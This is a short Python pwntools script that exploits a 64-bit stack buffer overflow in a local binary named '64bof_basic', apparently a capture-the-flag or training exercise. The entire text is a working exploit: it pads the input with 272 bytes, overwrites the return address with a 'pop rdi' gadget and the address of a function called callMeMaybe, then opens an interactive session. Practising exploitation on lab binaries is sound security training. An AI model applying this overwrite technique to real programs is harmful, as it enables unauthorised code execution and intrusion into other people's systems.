from pwn import *

p = process("./64bof_basic")
callMeMaybe = 0x400606
pr_rdi = 0x400713


payload = ''
payload += "A"*272
payload += p64(pr_rdi)
payload += p64(callMeMaybe)

p.sendline(payload)
p.interactive()